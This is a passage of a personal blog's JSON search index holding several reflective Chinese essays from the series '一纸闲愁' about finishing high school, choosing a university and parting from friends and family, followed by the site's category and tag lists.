如果可以，请让我预支一段如莲的时光，哪怕将来某一天加倍偿还。这个雨季会在何时停歇，无从知晓。但我知道，你若安好，便是晴天。”（林徽因传） -THE END- 2012年11月","categories":[{"name":"whisper","slug":"whisper","permalink":"https://www.hrwhisper.me/categories/whisper/"},{"name":"一纸闲愁","slug":"whisper/一纸闲愁","permalink":"https://www.hrwhisper.me/categories/whisper/%E4%B8%80%E7%BA%B8%E9%97%B2%E6%84%81/"}],"tags":[{"name":"心情","slug":"心情","permalink":"https://www.hrwhisper.me/tags/%E5%BF%83%E6%83%85/"}]},{"title":"一纸闲愁4 一路向北","slug":"emotion-at-a-paper-4","date":"2014-11-30T16:04:16.000Z","updated":"2021-01-08T13:42:14.108Z","comments":true,"path":"emotion-at-a-paper-4/","link":"","permalink":"https://www.hrwhisper.me/emotion-at-a-paper-4/","excerpt":"一纸闲愁4写于离开家去FZU的时候","text":"一纸闲愁4写于离开家去FZU的时候 目录： 1.那两人 2.一路向北 3.附录 BGM：梁咏琪 - 还是那个你 1.那两人 ⑴你本可以不成为她，她只是你一道分身。 可你偏偏选择成为她。你渴望，因为他在你身上留下那道灿烂而又神奇的印记，无人可以夺走。 还记得那一抹空山灵雨。 尽是离人泪。 那一天，仙界的天地飘着点点细雨，撑着伞，送他远去。 “若我还在世间，会回来。” “若我还在世间，会迎你。”几句话，割裂了怎样的情怀。 这一别，也许没有相逢之日。 什么时候，雨水把眼泪悄悄收藏，回忆在心里开始残落。 这一天，仙界内外充斥这杀戮的声音，浸染了你一身的空灵。 你紧握手中剑，下了某种决断。 往事如烟，一切都是马上经历，仅此一次，不能准备。好像一个演员没有排练就上了舞台。所以才有你与他的羁绊，他的恨，你的愁。 但那毕竟是过往，飘然远去。 你流下泪来，因为，此生不能迎他。 他何曾让你失望过，他回来了。 ⑵你说，你与他，是鱼与飞鸟。 初见，你问“何为天？”天之大，将你们联系。天之小，又如同一个狭窄的笼，将你们心围困。 你在他的所化的石像旁苦苦祈祷，用鲜血涂遍石像全身。 不悔与执着。 但你说“是恩，不是情”从此躲着他。 婉儿复活后，你默然看他们携手远去，流下泪来，“前一世的鱼儿，就是这样在水中看飞鸟渐渐远去的” “但这一世，我们不是鱼与飞鸟。” 对么。 蓦然回首，你看到了那在灯火阑珊处向你微笑的他。 2.一路向北 就这样，新的生活即将猝不及防的撞进熟悉的轨迹。 人永远都无法知道自己该要什么，因为人只能活一次，既不能拿它与前世相比，也不能在来生加以修正。谁会知晓今天所做的事情会有何意义？那是徒劳无用，还是埋下成功的密匙？这只能在未来加以验证。 淡淡的离别愁绪涌上心头。 除了离别，还是离别。 夜阑笙歌起，不尽离人泪。 离开了你，他，还有他们，还有这土地。 每个人心中都藏着一些茧。将愁情包裹，生怕袒露。 多情自古伤离别，我又将冷落谁？时间又将冲洗我对谁的记忆？ 我一直不知道，究竟是流水带走了忧伤，还是忧伤随着流水一起流淌？ 别时容易见时难。 若是离去，后会无期了么。 你是谁的心伤，带走了谁的依恋，又开始了谁的想念。 把记忆轻启后。 谁会知晓，远方的天空下，是否还会有你我交汇的轨迹？ 我一路向北，离开有你的季节。任凭梦里三千落花。那条落英缤纷的路，又该通往何方？ PS：为什么要提到仙逆里面那两人？他们有的是别离，更甚的是相逢的喜悦。灯火阑珊处，你我依然。 3.附录 ⑴这一次我离开你，大概就不容易再见到你了。暮色过后，我会真正离开，就让天上温柔的晚霞做最后见证，有一天再看见同样美丽的晚霞，不管在何时何地，我都会想起你来。——林清玄《季节十二帖》 ⑵偶然 徐志摩 我是天空里的一片云， 偶尔投影在你的波心—— 你不必惊异， 更无须欢喜—— 在转瞬间消灭了踪影。 你我相逢在黑夜的海上， 你有你的， 我有我的，方向； 你记得也好， 最好你忘掉， 在这交会时互放的光亮。","categories":[{"name":"whisper","slug":"whisper","permalink":"https://www.hrwhisper.me/categories/whisper/"},{"name":"一纸闲愁","slug":"whisper/一纸闲愁","permalink":"https://www.hrwhisper.me/categories/whisper/%E4%B8%80%E7%BA%B8%E9%97%B2%E6%84%81/"}],"tags":[{"name":"心情","slug":"心情","permalink":"https://www.hrwhisper.me/tags/%E5%BF%83%E6%83%85/"}]},{"title":"一纸闲愁3 远方的荧光","slug":"emotion-at-a-paper-3","date":"2014-11-30T16:03:40.000Z","updated":"2020-10-19T14:35:48.729Z","comments":true,"path":"emotion-at-a-paper-3/","link":"","permalink":"https://www.hrwhisper.me/emotion-at-a-paper-3/","excerpt":"一纸闲愁3写于2012-08-23 ，主要是看到了有人写的你是不曾还是不会。 有所感触。","text":"一纸闲愁3写于2012-08-23 ，主要是看到了有人写的你是不曾还是不会。 有所感触。 1.你是不曾，还是不会 2.这雨 3.Breathing of dawn（黎明之息） 4.远方的荧光 BGM:：这样爱了-张婧 1.你是不曾，还是不会 徐志摩说：我是天空里的一片云，偶尔投影在你的波心。” 多久了，你的名字还是常浮光掠影般闪过我的脑海。 但你不会，像我一样，在某个名字上停留片刻，不是么， 你不会，像我一样在谁的话语间停留许久，在那句话里窥见谁的影子，不是么， 你不会，不是么， 你从不会，是么。 我不过是那轻微的反光，偶尔能照射到你心的窗户。 有的人就像流星，在对方心中只留下刹那的光辉，转眼便消失了它的焰舌，只能在黑暗孤寂时，看回忆的碎片，散落一地的温柔。 时光的错位 谁会记得谁。 还是想问，你是不曾，还是不会？ 2.这雨 这雨，生于天，死于地，中间的过程，便是人生。 命运是一张地图。 念天地之悠悠，独怅然而涕下。 雨来了，带着一丝愁愫。 “细看来，不是杨花，点点是离人泪。” 那么，这雨，是谁的泪。 漫天的雨丝，究竟触动了我哪根神经，竟想悄悄的把雨收藏。 它也不知，前方是什么，会遇到什么，便稍纵即逝，飘荡、降落。 你可曾羡慕它轻飘飘的感觉，如诗一般的画卷。 然而从未见过任何一滴雨水，可以直线下落，它们总是因风、因雨、因自身之重，随时在调整着降落的位置，你可看出雨水的不甘？ 这只不过是一张未探测过的地图，地图上只有已到达的坐标。 它怕，它怕调入臭水沟中，引得一身臭气：也怕降落在汹涌的洪水中，成了灾难的帮凶…… 它掉落的是它紧密的忧愁。脆落的淋下，只有淅沥的声响。 前方是哪？前无古人，后无来者，又有谁知晓？ 3.Breathing of dawn（黎明之息） 就是喜欢这个名字，不为什么。 霞光万丈，如一把光芒之剑向四周挥舞，黑暗只有不断退却。 初阳抬头。 红色的光芒变成了金色…… 我喜欢早，不知为何。 也许，因为晚起,一门通向死亡的艺术， 也许，因为清晨的清静，不见夜晚都市的繁华。 Breathing of dawn，一遍遍默念这个名字。 4.远方的荧光 过去的画卷，已经渐行渐远，化成了远方的荧光。 你只会不停往前追，追回种种你错过的美 。 那木兰香，又怎么遮得住伤。 此刻，牛郎织女在倾诉着怎样的相思之苦， 你看见了么？ 在这交会时互放的光亮。 那么，What's new？ -THE END- 2012.8.22~23","categories":[{"name":"whisper","slug":"whisper","permalink":"https://www.hrwhisper.me/categories/whisper/"},{"name":"一纸闲愁","slug":"whisper/一纸闲愁","permalink":"https://www.hrwhisper.me/categories/whisper/%E4%B8%80%E7%BA%B8%E9%97%B2%E6%84%81/"}],"tags":[{"name":"心情","slug":"心情","permalink":"https://www.hrwhisper.me/tags/%E5%BF%83%E6%83%85/"}]},{"title":"一纸闲愁2 那么，走吧","slug":"emotion-at-a-paper-2","date":"2014-11-30T16:02:24.000Z","updated":"2021-01-08T13:42:14.108Z","comments":true,"path":"emotion-at-a-paper-2/","link":"","permalink":"https://www.hrwhisper.me/emotion-at-a-paper-2/","excerpt":"一纸闲愁2 写于2012年7月19，填自愿的时候。 那时候在纠结要填厦大还是福大，最后觉得还是专业优先吧。怕被调剂到不喜欢的专业去了。","text":"一纸闲愁2 写于2012年7月19，填自愿的时候。 那时候在纠结要填厦大还是福大，最后觉得还是专业优先吧。怕被调剂到不喜欢的专业去了。 目录 1.时间 2.我能听到 3.那么，走吧。 4.结语 BGM:雪中花-王麟 1.时间 时间，是握不住的细沙，总是会在指间偷偷滑落。即使攥紧拳头，依旧弃你而去。 斩不断时间的羁绊，挽不回流去的岁月。于是独自叹息。叹时间太瘦，指缝太宽。又叹人生苦短，生命只是莲叶上的一颗露珠。 萤火对群星说：“学者说你的光芒总有一天会消失。”群星不语，没有应答。 那么,何谓永恒？这蕴含着古老而又纯真的字眼，恐怕不易回答。生命只是莲叶上的一颗露珠。那便让它折射出应有的光泽。 生命是做减法，我们应该用加法来成就它的意义。当今天变成了昨天，明天变成了今天。你便意识到时间并不是真正的逝去，他只是在我们的面前消失，再偷偷的改变我们的容貌。 那么，当你老了，白发苍苍，步履蹒跚，你回头，是刻骨铭心的悔恨，还是云霞漫天依然？ 我一直对自己说：“如果你憧憬未来，那么请做好现在。” 于是步履匆匆。 也曾幻想过，坐在圆桌旁，两边展开，是碧绿的树林，喝一口茶，悠然远望，看世间，演绎的，又是哪一曲流觞。 又或者，幻想穿越地平线，扯起地平线的帷幔，寻找天的边际。那时并未想到地平线后还有地平线。 又或者，凝望天空，把一个熟识的名字编织进蔚蓝里。但一想到，又有谁能从天空中过滤出蔚蓝？这将会是怎样的落寂不堪。 但我运气不好，因为时光短暂。 我们可以付出的东西毕竟那么有限，经不起虚掷和挥霍，因为时光短暂。钟表确实可以回到起点，但那已经不是昨天。 那么，只能在这，无端的发着牢骚。这些既无用、无趣，又愚笨。不是吗？ 没有尝试，梦想永远只是梦想。若你真的想高飞，那应该自己创造一双翅膀。痴想与祈祷，都无法缩短你和梦想间，哪怕一小寸的距离！那不过是怯懦者的憧憬、失败者的自我安慰罢了。 2.我能听到 我能听到， 那是你日日夜夜翘首企盼，萦绕在口中的梦呓，并为之付出了无尽的汗水。 满屋漆黑。停电。 于是点起了蜡烛，房屋里便蒙上了一层别样的微黄。 古人秉烛夜游，是否是为了心中的那一份渴望？于是仰头望明月，寄情千里光。 于是把默默的情怀，在月光下踯躅，在睡梦里展望。 只是月亮再亮，终究冰凉。 当现实的晦暗，仿佛是仿佛是烦恼、痛苦、失败，或庸俗的尾曳，一点一点的蚕食这他理想新月所放射出的清辉，唯只见，旧情衰谢，那么“得之，我幸：不得，我命。” 是的，得之我幸，失之我命。 我能听到，那声叹息又不偏不倚,是我心悸的原因。 我能听到，那硬币反面落地后，清脆的响声，撞破了一颗怎样炽热的心。 3.那么，走吧。 “世与我而相违，复驾言兮焉求”，不如归去。 那么，走吧。 每个人都会对人生中最重要的地方、最重要的人物一一告别，却都无法预想告别方式。 那么，让我生命中的万水千山，依次向你告别。 那么，走吧。 李白乘舟，苏东坡走马，陆游则是骑驴。我们生来就是旅人，但我无马无舟无驴，便用双脚走过。 我就这样向你告别，无言、无泪、无伤，只有一纸浓墨。 别时容易见时难，我若离去，后会无期。 那么，就这样把，从此山水不相逢。 因为我说过，泉水既已堵塞，那便不是我的山寨。 4.结语 谨以此文，以此献给我曾经奋斗过的梦想。- 用最近看到的诗句来谢幕吧： “记忆地从前，从此成了遥远。 风中的流沙，不再弥漫梦地空间，呜咽的羌笛，只剩下苍凉地回旋。 昨日的吟唱，没了共鸣的相通，呢喃的倾诉，找不到聆听的琴声。 平凡的你我，也需要精彩的张扬，用无悔的追求，去感受天地的浩荡。” -THE END- 2012.7.16~7.19","categories":[{"name":"whisper","slug":"whisper","permalink":"https://www.hrwhisper.me/categories/whisper/"},{"name":"一纸闲愁","slug":"whisper/一纸闲愁","permalink":"https://www.hrwhisper.me/categories/whisper/%E4%B8%80%E7%BA%B8%E9%97%B2%E6%84%81/"}],"tags":[{"name":"心情","slug":"心情","permalink":"https://www.hrwhisper.me/tags/%E5%BF%83%E6%83%85/"}]},{"title":"一纸闲愁 毕业时","slug":"emotion-at-a-paper-1","date":"2014-11-30T16:01:34.000Z","updated":"2020-10-19T14:35:48.728Z","comments":true,"path":"emotion-at-a-paper-1/","link":"","permalink":"https://www.hrwhisper.me/emotion-at-a-paper-1/","excerpt":"一纸闲愁一，写于2012.6.11。高考完后第三天。","text":"一纸闲愁一，写于2012.6.11。高考完后第三天。 Part1 一年总结 不知不觉一年的时光也如白驹过隙，蓦然回首旧城往事已昨昔今非。 一年来是那独上高楼，望尽天涯路的期许，还是那衣带渐宽终不悔的执着？ 抑或是“尽吾志也不能至者，可以无悔矣”的蓦然回首？ 一路走来， 每一步、每一笔都汇成华美的乐章。 我们都是凡人，在一次次的成功与挫败、得志与失意、辉煌与黯淡中前行。 前方等着我们的，是那八百里芳草路的芬芳，还是满目的狼藉？ 但我们仍旧义无反顾的前行，哪怕启程时，只听见威胁的雷鸣，听不见黎明的诺言。 因为深知，这是前行的路，不是归返的路。 关键词：路 Part2 给朋友 因为毕业，朝夕相处的伙伴开始各奔东西，追逐着属于自己的未来。 从此分道扬镳，从此，散失在这人海茫茫，天各一方。 你我他，今后会有怎样的挑战，拥有怎样的前程与未来？ 迷茫与恍惚，时时模糊我们的视线。 十字路口依然徘徊。 曲终人散终究是要谢幕的，要走的，终究是留不住的。 愿我们，能记得彼此，相遇在这最美的时刻。 歌词“不管今天或明天，各奔东西，我们都要活得比现在更美丽。”（微笑的理由、梁静茹） Part3给老师 三尺讲台，是你们的舞台。 我所恋者，是廷海的热情奔放，还是其它老师的熠熠生辉？ 感谢有你，在我成长的时刻。 感谢阿娜对我的鼓舞“记住学习不是为了考试”“上差点的学校也没关系”“下次再加油”…… 也感谢廷海“稳中求进”的建议，“学习是让人自信的过程”“把它当成一种挑战，这是你是否具备能力的检测” …… 等等。 你们的教导，吾岂敢忘怀。 明天去看阿娇o(∩_∩)o 关键词：感激 Part4给考试 记得每次考试，考卷都像恶魔似的像我嘲笑。 总有一天我会干掉你的，暗暗发誓着。 你可知把自己埋进密不透风的黑萤，为的是有一朝能够破萤成蝶的期盼与辛劳？ 你可知战战兢兢，如临深渊，如履薄冰，时刻小心谨慎的劳累！ 仅仅是为了那个分数，多么讽刺！ 理想与现实那道不可逾越的鸿沟，横亘在我们面前，阻断了我们前行的路。 厦大早已化成了恒远而持久的梦想，化为口中萦绕不绝的梦呓。 一模、二模如两个巴掌猝不及防的打在脸上，清脆而响亮。 那时，滑入低谷，只有满目的不甘。“念天地之悠悠，独怅然而涕下。” 廷海说得对“仅仅是自己能力，不足则去加强” 是，尽吾志也不能至者，可以无悔矣。 我至少可以问心无愧的说“我无悔” 我会去加强自己的能力，一定。 那一天，萦绕在耳边的只有一曲年轻的战场， 请为我骄傲鼓掌。 关键词：能力。 Part5给父母 我该用什么话，去表达无上的感激。 感谢爸每天不辞辛苦送我上学， 父母对我的宽容理解“不行就上本二。” 我辈岂是蓬高人？但我只能笑笑，放入心底。 努力是无声的回报。 我无法一一列举。 那一句“爸没本事，希望儿子能有出息”的酒后一言， 我时时记住。 相对无言，惟有泪千行。 爸爸妈妈，我总有一天会成为你们的骄傲的，我发誓。 我要做全新的自己。 关键句：你拿你一生的幸福做赌注，我怎么舍得让你输。 总结。 \"高远的目标不会让我望而生畏，虽然在达到目标以前可能屡受挫折。摔倒了，再爬起来，我不灰心，因为每个人在抵达目标前都会受到挫折。只有小爬虫不必担心摔倒。我不是小爬虫，不是洋葱，不是绵羊。我是一个人。让别人作他们的粘土造洞穴吧，我只要造一座城堡。 如迅疾而过的风，扬起沉夜里不可阻挡的熹微，正如初日终会降临。在这一刻迈步，甩开那些仍在沉睡的呼吸，傲然奔行。汹涌的晨光流泻在用黑色勾出的绝美的身影里，铸成滚烫的护身符。一切取决于你。若你决定灿烂，山无遮，海无拦。\" 不管你愿不愿意，一个新的起跑线又划在这里。前行吧。 THE END- 2012.6.11 修正了一个错别字。2012.6.12 增加几句话，再次修正一处错误。2012.6.13","categories":[{"name":"whisper","slug":"whisper","permalink":"https://www.hrwhisper.me/categories/whisper/"},{"name":"一纸闲愁","slug":"whisper/一纸闲愁","permalink":"https://www.hrwhisper.me/categories/whisper/%E4%B8%80%E7%BA%B8%E9%97%B2%E6%84%81/"}],"tags":[{"name":"心情","slug":"心情","permalink":"https://www.hrwhisper.me/tags/%E5%BF%83%E6%83%85/"}]}],"categories":[{"name":"study","slug":"study","permalink":"https://www.hrwhisper.me/categories/study/"},{"name":"自动驾驶","slug":"study/自动驾驶","permalink":"https://www.hrwhisper.me/categories/study/%E8%87%AA%E5%8A%A8%E9%A9%BE%E9%A9%B6/"},{"name":"whisper","slug":"whisper","permalink":"https://www.hrwhisper.me/categories/whisper/"},{"name":"谁的呢喃","slug":"whisper/谁的呢喃","permalink":"https://www.hrwhisper.me/categories/whisper/%E8%B0%81%E7%9A%84%E5%91%A2%E5%96%83/"},{"name":"code","slug":"code","permalink":"https://www.hrwhisper.me/categories/code/"},{"name":"Leetcode","slug":"code/Leetcode","permalink":"https://www.hrwhisper.me/categories/code/Leetcode/"},{"name":"others","slug":"others","permalink":"https://www.hrwhisper.me/categories/others/"},{"name":"建站经验","slug":"others/建站经验","permalink":"https://www.hrwhisper.me/categories/others/%E5%BB%BA%E7%AB%99%E7%BB%8F%E9%AA%8C/"},{"name":"机器学习","slug":"study/机器学习","permalink":"https://www.hrwhisper.me/categories/study/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"},{"name":"比赛","slug":"code/比赛","permalink":"https://www.hrwhisper.me/categories/code/%E6%AF%94%E8%B5%9B/"},{"name":"信息安全","slug":"study/信息安全","permalink":"https://www.hrwhisper.me/categories/study/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"},{"name":"python learning","slug":"study/python-learning","permalink":"https://www.hrwhisper.me/categories/study/python-learning/"},{"name":"算法笔记","slug":"study/算法笔记","permalink":"https://www.hrwhisper.me/categories/study/%E7%AE%97%E6%B3%95%E7%AC%94%E8%AE%B0/"},{"name":"计算机基础","slug":"study/计算机基础","permalink":"https://www.hrwhisper.me/categories/study/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"},{"name":"课程设计","slug":"study/课程设计","permalink":"https://www.hrwhisper.me/categories/study/%E8%AF%BE%E7%A8%8B%E8%AE%BE%E8%AE%A1/"},{"name":"OtherCodes","slug":"code/OtherCodes","permalink":"https://www.hrwhisper.me/categories/code/OtherCodes/"},{"name":"WEB前端","slug":"study/WEB前端","permalink":"https://www.hrwhisper.me/categories/study/WEB%E5%89%8D%E7%AB%AF/"},{"name":"技术改变生活","slug":"技术改变生活","permalink":"https://www.hrwhisper.me/categories/%E6%8A%80%E6%9C%AF%E6%94%B9%E5%8F%98%E7%94%9F%E6%B4%BB/"},{"name":"开发环境/开发工具","slug":"开发环境-开发工具","permalink":"https://www.hrwhisper.me/categories/%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83-%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/"},{"name":"问题解决","slug":"others/问题解决","permalink":"https://www.hrwhisper.me/categories/others/%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3/"},{"name":"沙海拾贝","slug":"whisper/沙海拾贝","permalink":"https://www.hrwhisper.me/categories/whisper/%E6%B2%99%E6%B5%B7%E6%8B%BE%E8%B4%9D/"},{"name":"生产力","slug":"生产力","permalink":"https://www.hrwhisper.me/categories/%E7%94%9F%E4%BA%A7%E5%8A%9B/"},{"name":"数据库","slug":"study/数据库","permalink":"https://www.hrwhisper.me/categories/study/%E6%95%B0%E6%8D%AE%E5%BA%93/"},{"name":"一些东东评测","slug":"others/一些东东评测","permalink":"https://www.hrwhisper.me/categories/others/%E4%B8%80%E4%BA%9B%E4%B8%9C%E4%B8%9C%E8%AF%84%E6%B5%8B/"},{"name":"读书笔记","slug":"study/读书笔记","permalink":"https://www.hrwhisper.me/categories/study/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"},{"name":"一纸闲愁","slug":"whisper/一纸闲愁","permalink":"https://www.hrwhisper.me/categories/whisper/%E4%B8%80%E7%BA%B8%E9%97%B2%E6%84%81/"}],"tags":[{"name":"prediction","slug":"prediction","permalink":"https://www.hrwhisper.me/tags/prediction/"},{"name":"paper","slug":"paper","permalink":"https://www.hrwhisper.me/tags/paper/"},{"name":"self-driving car","slug":"self-driving-car","permalink":"https://www.hrwhisper.me/tags/self-driving-car/"},{"name":"Machine Learning","slug":"Machine-Learning","permalink":"https://www.hrwhisper.me/tags/Machine-Learning/"},{"name":"生活","slug":"生活","permalink":"https://www.hrwhisper.me/tags/%E7%94%9F%E6%B4%BB/"},{"name":"算法","slug":"算法","permalink":"https://www.hrwhisper.me/tags/%E7%AE%97%E6%B3%95/"},{"name":"leetcode","slug":"leetcode","permalink":"https://www.hrwhisper.me/tags/leetcode/"},{"name":"hexo","slug":"hexo","permalink":"https://www.hrwhisper.me/tags/hexo/"},{"name":"Wordpress","slug":"Wordpress","permalink":"https://www.hrwhisper.me/tags/Wordpress/"},{"name":"Deep Learning","slug":"Deep-Learning","permalink":"https://www.hrwhisper.me/tags/Deep-Learning/"},{"name":"Machine Learning model","slug":"Machine-Learning-model","permalink":"https://www.hrwhisper.me/tags/Machine-Learning-model/"},{"name":"nlp","slug":"nlp","permalink":"https://www.hrwhisper.me/tags/nlp/"},{"name":"machine learning math","slug":"machine-learning-math","permalink":"https://www.hrwhisper.me/tags/machine-learning-math/"},{"name":"Machine Learning tool","slug":"Machine-Learning-tool","permalink":"https://www.hrwhisper.me/tags/Machine-Learning-tool/"},{"name":"Data mining","slug":"Data-mining","permalink":"https://www.hrwhisper.me/tags/Data-mining/"},{"name":"天池","slug":"天池","permalink":"https://www.hrwhisper.me/tags/%E5%A4%A9%E6%B1%A0/"},{"name":"Linux","slug":"Linux","permalink":"https://www.hrwhisper.me/tags/Linux/"},{"name":"Ubuntu","slug":"Ubuntu","permalink":"https://www.hrwhisper.me/tags/Ubuntu/"},{"name":"python","slug":"python","permalink":"https://www.hrwhisper.me/tags/python/"},{"name":"HTTPS","slug":"HTTPS","permalink":"https://www.hrwhisper.me/tags/HTTPS/"},{"name":"Centos","slug":"Centos","permalink":"https://www.hrwhisper.me/tags/Centos/"},{"name":"Javascript","slug":"Javascript","permalink":"https://www.hrwhisper.me/tags/Javascript/"},{"name":"heap","slug":"heap","permalink":"https://www.hrwhisper.me/tags/heap/"},{"name":"wordpress","slug":"wordpress","permalink":"https://www.hrwhisper.me/tags/wordpress/"},{"name":"心情","slug":"心情","permalink":"https://www.hrwhisper.me/tags/%E5%BF%83%E6%83%85/"},{"name":"C++","slug":"C","permalink":"https://www.hrwhisper.me/tags/C/"},{"name":"Cool","slug":"Cool","permalink":"https://www.hrwhisper.me/tags/Cool/"},{"name":"爬虫","slug":"爬虫","permalink":"https://www.hrwhisper.me/tags/%E7%88%AC%E8%99%AB/"},{"name":"Java","slug":"Java","permalink":"https://www.hrwhisper.me/tags/Java/"},{"name":"dynamic programming","slug":"dynamic-programming","permalink":"https://www.hrwhisper.me/tags/dynamic-programming/"},{"name":"Data Structure","slug":"Data-Structure","permalink":"https://www.hrwhisper.me/tags/Data-Structure/"},{"name":"Bit Manipulation","slug":"Bit-Manipulation","permalink":"https://www.hrwhisper.me/tags/Bit-Manipulation/"},{"name":"windows10","slug":"windows10","permalink":"https://www.hrwhisper.me/tags/windows10/"},{"name":"windwos10 mobile","slug":"windwos10-mobile","permalink":"https://www.hrwhisper.me/tags/windwos10-mobile/"},{"name":"SEO","slug":"SEO","permalink":"https://www.hrwhisper.me/tags/SEO/"},{"name":"mongodb","slug":"mongodb","permalink":"https://www.hrwhisper.me/tags/mongodb/"},{"name":"nosql","slug":"nosql","permalink":"https://www.hrwhisper.me/tags/nosql/"},{"name":"lumia","slug":"lumia","permalink":"https://www.hrwhisper.me/tags/lumia/"},{"name":"priority-queue","slug":"priority-queue","permalink":"https://www.hrwhisper.me/tags/priority-queue/"},{"name":"svm","slug":"svm","permalink":"https://www.hrwhisper.me/tags/svm/"},{"name":"bow","slug":"bow","permalink":"https://www.hrwhisper.me/tags/bow/"},{"name":"knn","slug":"knn","permalink":"https://www.hrwhisper.me/tags/knn/"},{"name":"php","slug":"php","permalink":"https://www.hrwhisper.me/tags/php/"},{"name":"足球","slug":"足球","permalink":"https://www.hrwhisper.me/tags/%E8%B6%B3%E7%90%83/"},{"name":"win32com","slug":"win32com","permalink":"https://www.hrwhisper.me/tags/win32com/"},{"name":"JSP","slug":"JSP","permalink":"https://www.hrwhisper.me/tags/JSP/"},{"name":"kindle","slug":"kindle","permalink":"https://www.hrwhisper.me/tags/kindle/"},{"name":"环境配置","slug":"环境配置","permalink":"https://www.hrwhisper.me/tags/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"},{"name":"python库","slug":"python库","permalink":"https://www.hrwhisper.me/tags/python%E5%BA%93/"},{"name":"matplotlib","slug":"matplotlib","permalink":"https://www.hrwhisper.me/tags/matplotlib/"},{"name":"图像处理","slug":"图像处理","permalink":"https://www.hrwhisper.me/tags/%E5%9B%BE%E5%83%8F%E5%A4%84%E7%90%86/"},{"name":"Android","slug":"Android","permalink":"https://www.hrwhisper.me/tags/Android/"},{"name":"Book","slug":"Book","permalink":"https://www.hrwhisper.me/tags/Book/"},{"name":"reading notes","slug":"reading-notes","permalink":"https://www.hrwhisper.me/tags/reading-notes/"}]}